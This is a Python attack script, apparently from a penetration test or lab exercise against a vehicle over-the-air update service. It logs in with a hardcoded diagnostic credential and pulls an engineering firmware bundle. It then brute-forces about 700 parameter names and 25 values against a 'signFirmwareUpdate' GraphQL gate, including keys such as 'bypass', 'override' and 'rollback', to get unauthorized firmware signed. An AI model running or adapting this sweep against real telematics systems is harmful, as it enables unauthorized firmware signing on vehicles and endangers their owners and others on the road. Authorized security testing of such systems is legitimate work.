#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Stage M: wide variable-key dictionary sweep against the signFirmwareUpdate gate.

Only the registered VIN passes gate 1; gate 2 then says
"update campaign validation failed" no matter which of ~1700 single-key probes
we send.  This run widens the KEY dictionary to ~700 names (compound names
included) x a value set derived from the campaign/bundle, using one keep-alive
session.
"""
import base64, hashlib, io, json, os, zipfile, time
import requests

HERE = os.path.dirname(os.path.abspath(__file__))
EV = os.path.abspath(os.path.join(HERE, "..", "..", "03_EVIDENCE", "sign"))
VIN = "CV622697F82A936A1"
CAMP = "CAMP-243892C376D4CB2D5F826953"
CRED = "5e7f07b4a81153ecd5868cc02557f823"
PKG = "3ac02bb40567fa14062cc768e22fefac3dd972aee87a3bf2d01419f026d573d0"
TB = "http://10.225.139.3:8080"
TSP = "http://10.225.139.2:8080/graphql"
REF = '{"errors":[{"message":"update campaign validation failed"}]}'

s = requests.Session()
s.auth = ("diag", CRED)
r = s.get(TB + "/api/v1/ota/engineering-bundle", timeout=20)
z = zipfile.ZipFile(io.BytesIO(r.content))
man = json.loads(z.read("manifest.json"))
NONCE = man["nonce"]
VCU = z.read("vcu-reference.bin")
VCU_SHA = hashlib.sha256(VCU).hexdigest()

PRE = ["campaign", "update", "ota", "vcu", "firmware", "vehicle", "target", "package",
       "bundle", "updateCampaign", "vehicleCampaign", "otaCampaign", "vcuUpdate",
       "firmwareUpdate", "asset", "artifact", "release", "software"]
SUF = ["Id", "ID", "Key", "Token", "Code", "Name", "Ref", "Reference", "Counter", "Value",
       "Size", "Sha256", "Hash", "Address", "Slot", "Generation", "Version", "State",
       "Status", "Flag", "Payload", "Data", "Blob", "Nonce", "Credential", "Secret"]

KEYS = set()
for p in PRE:
    KEYS.add(p)
    for su in SUF:
        KEYS.add(p + su)
        KEYS.add(p[0].lower() + p[1:] + su)
KEYS |= set("""
vin campaignId campaign campaignName campaignKey campaignToken campaignRef campaignCode
campaignIdentifier updateCampaignId updateCampaign updateId updateKey updateToken
rollback rollbackCounter rollbackCount rollbackValue rollbackLevel maxRollback
minRollback rollbackAllowed rollbackEnabled allowedRollback rollbackLimit
vcuRollback vcuRollbackCounter vcuRollbackValue currentRollback targetRollback
firmware firmwareImage firmwareUpdate image payload data blob content
firmwareSha256 firmwareHash firmwareDigest vcuSha256 imageSha256
sha256 digest hash checksum md5 crc
size length firmwareSize imageSize vcuSize updateSize payloadSize totalSize
address updateAddress vcuUpdateAddress firmwareAddress imageAddress loadAddress
offset baseAddress flashAddress target addressOffset
vcu vcuReference reference referenceFirmware vcuImage vcuFirmware vcuPackage
signature sig signed signatureRequest signatureAlgorithm algorithm alg curve
packageKey packageCredential firmwareCredential credential credentials key secret
token apiKey auth authKey authorization authorized
nonce bundleNonce updateNonce requestNonce challenge
slot slotId target destination targetVersion version generation
type kind format encoding mode ecu ecuId
id uuid guid
force override bypass debug dryRun simulate allowUpdate
status state phase stage
timestamp epoch time date
counter sequence seq index revision
authorizedUpdate commit commitUpdate
objective objectives final flag
diagnostic diagnostics manifest bundle engineering
updateRequest signingRequest authorizationRequest
""".split())

VALUES = [CAMP, VIN, CRED, PKG, VCU_SHA, NONCE, 2, 1, 0, 1024, 16384, "0x08040000",
          "vcu", "VCU", "active", "authorized", "approved", "pending", True, False, "",
          "CV6-OTA-1", "CAMP", "update", "sign"]

print(f"[*] {len(KEYS)} keys x {len(VALUES)} values = {len(KEYS) * len(VALUES)} probes")


def gql(v):
    r = s.post(TSP, json={"query": "signFirmwareUpdate", "variables": v}, timeout=12)
    return r.status_code, r.text.strip()


def main():
    diffs = []
    n = 0
    t0 = time.time()
    for k in sorted(KEYS):
        for val in VALUES:
            body = {"vin": VIN, k: val}
            st, txt = gql(body)
            n += 1
            if txt != REF:
                diffs.append({"k": k, "v": str(val)[:80], "s": st, "r": txt[:400]})
                print(f"  !DIFF {k}={str(val)[:40]!r} -> {txt[:180]}", flush=True)
        if n % 2000 == 0:
            print(f"    ...{n} probes, {round(time.time() - t0, 1)}s", flush=True)
    print(f"[*] {n} probes, {len(diffs)} deviations, {round(time.time() - t0, 1)}s")
    json.dump(diffs, open(os.path.join(EV, "M_key_sweep.json"), "w"), indent=1)


if __name__ == "__main__":
    main()
